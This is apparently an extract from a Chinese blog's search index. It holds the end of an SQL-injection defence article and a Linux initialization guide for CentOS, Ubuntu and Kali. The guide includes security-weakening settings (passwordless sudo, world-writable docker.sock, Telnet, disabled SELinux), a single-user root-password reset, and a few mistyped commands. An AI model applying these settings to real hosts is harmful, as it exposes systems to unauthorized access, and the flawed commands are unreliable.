&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure><h5 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正确的使用PrepareStatement可以有效避免SQL注入，使用？作为占位符，进行参数化查询</span></span><br><span class="line">String sql = <span class="string">&quot;select * from users where id = ?&quot;</span>;</span><br><span class="line">PreparedStatement st = conn.prepareStatement(sql);</span><br><span class="line">st.setString(<span class="number">1</span>, id);</span><br><span class="line">ResultSet rs = st.executeQuery();</span><br></pre></td></tr></table></figure><h5 id="ESAPI安全框架"><a href="#ESAPI安全框架" class="headerlink" title="ESAPI安全框架"></a>ESAPI安全框架</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ESAPI (OWASP企业安全应用程序接口)是一个免费、开源的、网页应用程序安全控件库，它使程序员能够更容易写出更低风险的程序</span></span><br><span class="line">Codec&lt;Character&gt; oracleCodec = <span class="keyword">new</span> OracleCodec();</span><br><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line">String sql = <span class="string">&quot;select * from users where id = &#x27;&quot;</span> + ESAPI.encoder().encodeForSQL(oracleCodec, id) + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br></pre></td></tr></table></figure><h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.admintony.com/SQL%E6%B3%A8%E5%85%A5-insert%E3%80%81update%E3%80%81delete%E6%B3%A8%E5%85%A5.html">SQL注入-insert、update、delete注入</a></p><p><a href="https://www.cnblogs.com/missmzt/p/7676800.html">windows下mysql loadfile返回NULL的解决</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> MySQL </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux初始化</title>
      <link href="/p/79dc0da1.html"/>
      <url>/p/79dc0da1.html</url>
      
        <content type="html"><![CDATA[<p>工作的时候经常会创建很多Linux主机，为了使这些机器马上能有生产力，写一个关于初始化它们的文档</p><h2 id="Centos初始化"><a href="#Centos初始化" class="headerlink" title="Centos初始化"></a>Centos初始化</h2><h3 id="添加sudo权限"><a href="#添加sudo权限" class="headerlink" title="添加sudo权限"></a>添加sudo权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">chmod u+w /etc/sudoers</span><br><span class="line">vi /etc/sudoers</span><br><span class="line">username ALL=(ALL) NOPASSWD: ALL</span><br><span class="line">chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure><blockquote><p>如果没有还原权限后续执行sudo会报错<code>chmod 0440 /etc/sudoers</code></p></blockquote><h3 id="更改yum源"><a href="#更改yum源" class="headerlink" title="更改yum源"></a>更改yum源</h3><p><strong>centos8</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure><h3 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h3><p>检测是否安装ssh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list installed | grep openssh-server</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install openssh-server</span><br></pre></td></tr></table></figure><p>配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">Port 22</span><br><span class="line"><span class="meta">#</span><span class="bash">AddressFamily any</span></span><br><span class="line">ListenAddress 0.0.0.0</span><br><span class="line">ListenAddress ::</span><br></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service sshd start</span><br></pre></td></tr></table></figure><p>检测 sshd服务是否开启 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -e | grep sshd</span><br></pre></td></tr></table></figure><p>检测 22 号端口是否开启 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an | grep 22</span><br></pre></td></tr></table></figure><p>将 sshd 服务设置为开机自启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable sshd.service</span><br></pre></td></tr></table></figure><p>检测是否开启开机自动启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files | grep sshd</span><br></pre></td></tr></table></figure><h3 id="重新设置root密码"><a href="#重新设置root密码" class="headerlink" title="重新设置root密码"></a>重新设置root密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><h3 id="配置IP"><a href="#配置IP" class="headerlink" title="配置IP"></a>配置IP</h3><p>修改<code>/etc/sysconfig/network-scripts/</code> 目录下的网卡文件来配置系统的IP地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOTPROTO=&quot;static&quot; #dhcp改为static </span><br><span class="line">ONBOOT=&quot;yes&quot; #开机启用本配置</span><br><span class="line">IPADDR=192.168.7.106 #静态IP</span><br><span class="line">GATEWAY=192.168.7.1 #默认网关</span><br><span class="line">NETMASK=255.255.255.0 #子网掩码</span><br><span class="line">DNS1=192.168.7.1 #DNS 配置</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br><span class="line">systemctl network restart</span><br></pre></td></tr></table></figure><h4 id="开启DHCP"><a href="#开启DHCP" class="headerlink" title="开启DHCP"></a>开启DHCP</h4><p>设置网卡配置文件：<code>ONBOOT = YES</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/network restart</span><br></pre></td></tr></table></figure><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211104094754060.png" alt="image-20211104094754060" style="zoom: 150%;" /><h3 id="设置时区和时间"><a href="#设置时区和时间" class="headerlink" title="设置时区和时间"></a>设置时区和时间</h3><h4 id="查看当前时区"><a href="#查看当前时区" class="headerlink" title="查看当前时区"></a>查看当前时区</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl</span><br></pre></td></tr></table></figure><h4 id="列出所有可用时区"><a href="#列出所有可用时区" class="headerlink" title="列出所有可用时区"></a>列出所有可用时区</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl list-timezones</span><br></pre></td></tr></table></figure><h4 id="设置上海时区"><a href="#设置上海时区" class="headerlink" title="设置上海时区"></a>设置上海时区</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo timedatectl set-timezone Asia/Shanghai</span><br></pre></td></tr></table></figure><blockquote><p>查看是否修改成功：<code>date</code> Fri Dec 14 10:48:05 CST 2018 如果显示CST则说明时区设置成功</p></blockquote><h4 id="查看时间和修改时间"><a href="#查看时间和修改时间" class="headerlink" title="查看时间和修改时间"></a>查看时间和修改时间</h4><p><strong>显示时间 :</strong>  <code>date</code></p><p><strong>修改时间</strong><code>date -s [time]</code></p><p>如：设置当前时间为：2018年12月10点50分</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date -s  ‘2018-12-14 10:50:00’</span><br></pre></td></tr></table></figure><p><strong>根据网络同步时间</strong></p><p>使用ntp同步标准时间，ntp：网络时间协议（network time protol）</p><p>安装：<code>yum install ntp</code></p><p>同步1：<code>ntpdate pool.ntp.org</code></p><p>同步2：<code>ntpdate -u ntp1.aliyun.com</code></p><p><strong>写入计划任务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0-59/10 * * * * /usr/sbin/ntpdate ntp1.aliyun.com | logger -t NTP</span><br><span class="line"># 或者</span><br><span class="line">0-59/10 * * * * /usr/sbin/ntpdate us.pool.ntp.org | logger -t NTP  </span><br></pre></td></tr></table></figure><h3 id="开启Telnet"><a href="#开启Telnet" class="headerlink" title="开启Telnet"></a>开启Telnet</h3><p>检查是否存在<code>telnet-server/telnet</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep telnet</span><br><span class="line"></span><br><span class="line">telnet-server-0.17-76.el8.x86_64</span><br><span class="line">telnet-0.17-76.el8.x86_64</span><br></pre></td></tr></table></figure><p>如不存在，安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install telnet-server</span><br><span class="line">yum install telnet</span><br></pre></td></tr></table></figure><p>安装xinetd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install xinetd </span><br></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start telnet.socket</span><br></pre></td></tr></table></figure><h3 id="docker-Centos8"><a href="#docker-Centos8" class="headerlink" title="docker(Centos8)"></a>docker(Centos8)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils  device-mapper-persistent-data  lvm2</span><br><span class="line"> </span><br><span class="line">sudo yum-config-manager  --add-repo   https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#国内</span></span></span><br><span class="line">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo </span><br><span class="line"> </span><br><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line">sudo systemctl start docker &amp;&amp; sudo systemctl enable docker</span><br></pre></td></tr></table></figure><h4 id="docker用户组"><a href="#docker用户组" class="headerlink" title="docker用户组"></a>docker用户组</h4><p>查看是否存在docker组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /etc/group | grep docker</span><br></pre></td></tr></table></figure><p>创建分组，将用户添加到这个分组里面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd -g 999 docker #-g 999为组ID，也可以不指定</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker testuser</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+rw /var/run/docker.sock</span><br></pre></td></tr></table></figure><blockquote><p>提示<code>get ......dial unix /var/run/docker.sock</code>权限不够，则修改<code>/var/run/docker.sock</code>权限</p></blockquote><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install docker-compose</span><br></pre></td></tr></table></figure><blockquote><p>更多安装方式参考：<a href="https://docs.docker.com/compose/install/">https://docs.docker.com/compose/install/</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure><blockquote><p>报错：<code>Command &quot;python setup.py egg_info&quot; failed with error code 1 in /tmp/pip-build-*</code></p></blockquote><h3 id="java环境安装与卸载"><a href="#java环境安装与卸载" class="headerlink" title="java环境安装与卸载"></a>java环境安装与卸载</h3><h4 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep jdk</span><br><span class="line">yum -y remove xxx</span><br><span class="line"></span><br><span class="line">yum list installed | grep java</span><br><span class="line">yum -y remove java-1.8.0-openjdk*</span><br><span class="line">yum -y remove tzdata-java.noarch</span><br><span class="line">copy-jdk-configs-3.3-10.el7_5.noarch</span><br></pre></td></tr></table></figure><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum search java|grep jdk </span><br><span class="line">yum install -y java-1.8.0-openjdk-devel.x86_64</span><br></pre></td></tr></table></figure><h4 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h4><p>下载源码包后修改配置文件<code>vim /etc/profile</code>，重载生效<code>source /etc/profile</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># SET JAVA HOME</span><br><span class="line">JAVA_HOME=/usr/local/java/jdk-17.0.1</span><br><span class="line">JRE_HOME=/usr/local/java/jdk-17.0.1/jre</span><br><span class="line">CLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line">export JAVA_HOME JRE_HOME CLASS_PATH PATH</span><br></pre></td></tr></table></figure><h4 id="jdk版本控制"><a href="#jdk版本控制" class="headerlink" title="jdk版本控制"></a>jdk版本控制</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alternatives --install &quot;/usr/bin/java&quot; &quot;java&quot; &quot;/usr/local/java/jdk1.8.0_60/bin/java&quot; 1</span><br><span class="line">alternatives --install &quot;/usr/bin/javac&quot; &quot;javac&quot; &quot;/usr/local/java/jdk1.8.0_60/bin/javac&quot; 1</span><br><span class="line">alternatives --install &quot;/usr/bin/javaws&quot; &quot;javaws&quot; &quot;/usr/local/java/jdk1.8.0_60/bin/javaws&quot; 1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alternatives --install /usr/bin/java java /usr/local/java/jdk-17.0.1/bin/java 2</span><br><span class="line">alternatives --install /usr/bin/javac javac /usr/local/java/jdk-17.0.1/bin/javac 2</span><br><span class="line">alternatives --install /usr/bin/javaws javaws /usr/local/java/jdk-17.0.1/bin/javaws 2</span><br></pre></td></tr></table></figure><p>删除配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives –remove java /usr/local/java/jdk-17.0.1/bin/java</span><br></pre></td></tr></table></figure><p>jdk选项</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alternatives --config java</span><br><span class="line">alternatives --config javac</span><br></pre></td></tr></table></figure><h3 id="centos6绕过密码root登录"><a href="#centos6绕过密码root登录" class="headerlink" title="centos6绕过密码root登录"></a>centos6绕过密码root登录</h3><p><a href="https://www.cnblogs.com/zoe233/p/11795253.html">https://www.cnblogs.com/zoe233/p/11795253.html</a></p><p>开机按ESC</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105140953911-211643204.png" alt="img"></p><p>按 e 键进入编辑模式；</p><p>选择Kernel /vmlinz-2.6.32-696.e16… … 后按 e 键编辑此项；</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105141006477-489960969.png" alt="img"></p><p>进入该编辑模式后，在quiet后面输入 simple 或者 1 然后回车；</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105141019059-229246587.png" alt="img"></p><p>按 b 键进入单用户模式；</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105141028767-381730791.png" alt="img"></p><p>passwd root 输入两次新密码；</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105141041687-334540775.png" alt="img"></p><p>使用 reboot 命令重启；</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1162655-20191105141053404-2062972422.png" alt="img"></p><h3 id="禁用selinux"><a href="#禁用selinux" class="headerlink" title="禁用selinux"></a>禁用selinux</h3><ul><li>打开配置文件<code>/etc/selinux/config</code>或者其符号链接<code>/etc/sysconfig/selinux</code>。</li><li>将<code>selinux =enforcing</code> 改成<code>selinux =disabled</code></li><li>重新启动系统或者使用<code>setEnforce 0</code>立即调用更改。</li></ul><h2 id="Ubuntu初始化"><a href="#Ubuntu初始化" class="headerlink" title="Ubuntu初始化"></a>Ubuntu初始化</h2><h3 id="配置IP地址"><a href="#配置IP地址" class="headerlink" title="配置IP地址"></a>配置IP地址</h3><p>临时配置ip，立即生效，但重启后无效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo ifconfig eth0 192.168.11.88 netmask 255.255.255.0 //设置网卡eth0的IP地址和子网掩码</span></span><br><span class="line"><span class="meta">$</span><span class="bash">sudo route add default gw 192.168.1.1 //设置网关</span></span><br></pre></td></tr></table></figure><p>修改配置文件<code>/etc/network/interfaces</code>，重启后生效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo vi /etc/network/interfaces</span></span><br><span class="line">添加以下内容：</span><br><span class="line"></span><br><span class="line">auto eth0 #设置自动启动eth0接口</span><br><span class="line">iface eth0 inet static #配置静态IP</span><br><span class="line">address 192.168.11.88  #IP地址 </span><br><span class="line">netmask 255.255.255.0  #子网掩码</span><br><span class="line">gateway 192.168.11.1   #默认网关</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/davidhzq/article/details/102991577">https://blog.csdn.net/davidhzq/article/details/102991577</a></p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl status ssh</span><br><span class="line">sudo ufw allow ssh</span><br></pre></td></tr></table></figure><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p><a href="https://blog.csdn.net/u012308586/article/details/102953882">https://blog.csdn.net/u012308586/article/details/102953882</a></p><p>查看的Ubuntu版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">Ubuntu 20.04.2 LTS \n \l</span><br></pre></td></tr></table></figure><p>跟换成阿里云的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;\</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security multiverse&quot;&gt;/etc/apt/sources.list</span><br></pre></td></tr></table></figure><h3 id="设置时间-amp-时区"><a href="#设置时间-amp-时区" class="headerlink" title="设置时间&amp;时区"></a>设置时间&amp;时区</h3><p>设置时区</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tzconfig</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果没有命令</span></span><br><span class="line">dpkg-reconfigure tzdata</span><br></pre></td></tr></table></figure><p>方式重启后时区改变</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure><p>同步时间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装ntpdate工具</span><br><span class="line">sudo apt-get install ntpdate</span><br><span class="line">设置系统时间与网络时间同步</span><br><span class="line">ntpdate cn.pool.ntp.org</span><br><span class="line">将系统时间写入硬件时间</span><br><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure><h3 id="选择编辑器"><a href="#选择编辑器" class="headerlink" title="选择编辑器"></a>选择编辑器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/var/log# select-editor </span><br><span class="line"></span><br><span class="line">Select an editor.  To change later, run &#x27;select-editor&#x27;.</span><br><span class="line">  1. /bin/ed</span><br><span class="line">  2. /bin/nano        &lt;---- easiest</span><br><span class="line">  3. /usr/bin/vim.basic</span><br><span class="line"></span><br><span class="line">Choose 1-3 [2]: 3</span><br></pre></td></tr></table></figure><h3 id="重装vim"><a href="#重装vim" class="headerlink" title="重装vim"></a>重装vim</h3><p>在Ubuntu14中会出现下图情况：</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210914150041796.png" alt="image-20210914150041796"></p><p>重装以下vim即可解决</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt remove vim-common</span><br></pre></td></tr></table></figure><blockquote><p>这里是vim-common不是vim</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install vim </span><br></pre></td></tr></table></figure><h3 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h3><p><code>gedit /etc/passwd</code> ,找到代表你的那一行，修改用户名为新的用户名。 注意：只修改用户名！后面的全名、目录等不要动！</p><p><code>gedit /etc/shadow</code>，找到代表你的那一行，修改用户名为新用户名  </p><p><code>gedit /etc/group</code>，你应该发现你的用户名在很多个组中，全部修改！</p><h4 id="修改ubuntu-后面的主机名"><a href="#修改ubuntu-后面的主机名" class="headerlink" title="修改ubuntu@后面的主机名"></a>修改ubuntu@后面的主机名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1625132400579-1ce6a872-27a2-40dc-91da-f291062ee7f2.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/hostname</span><br></pre></td></tr></table></figure><h3 id="更换系统内核"><a href="#更换系统内核" class="headerlink" title="更换系统内核"></a>更换系统内核</h3><h4 id="查看当前系统版本"><a href="#查看当前系统版本" class="headerlink" title="查看当前系统版本"></a>查看当前系统版本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><h4 id="查看内核"><a href="#查看内核" class="headerlink" title="查看内核"></a>查看内核</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><h2 id="安装VMtools"><a href="#安装VMtools" class="headerlink" title="安装VMtools"></a>安装VMtools</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp VMwareTools-XXXX ~</span><br></pre></td></tr></table></figure><blockquote><p>挂载光盘文件权限为只读，且无法更改</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 VMwareTools-XXXX</span><br><span class="line">tar zxvf VMwareTools-XXXX</span><br><span class="line">./vmware-install.pl</span><br></pre></td></tr></table></figure><p>安装成功后还无法复制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/vmware-user</span><br></pre></td></tr></table></figure><blockquote><p>复制粘贴、拖拽、窗口缩放等问题都是因为这个进程没有启动起来,在终端输入上面的命令</p></blockquote><h2 id="Kail初始化"><a href="#Kail初始化" class="headerlink" title="Kail初始化"></a>Kail初始化</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://www.kali.org/get-kali/">kali下载</a></p><h3 id="解决中文乱码"><a href="#解决中文乱码" class="headerlink" title="解决中文乱码"></a>解决中文乱码</h3><ol><li><p>更改默认编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><blockquote><p>进入图形化界面后（用上下方向键、空格是选择，Tab是切换，*是选中），选中zh_CN.UTF-8，确定后，将zh_CN.UTF-8选为默认。</p></blockquote></li><li><p>安装字体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update -y &amp;&amp; apt install xfonts-intl-chinese ttf-wqy-microhei</span><br></pre></td></tr></table></figure></li><li><p>重启系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure></li></ol><h3 id="更改源"><a href="#更改源" class="headerlink" 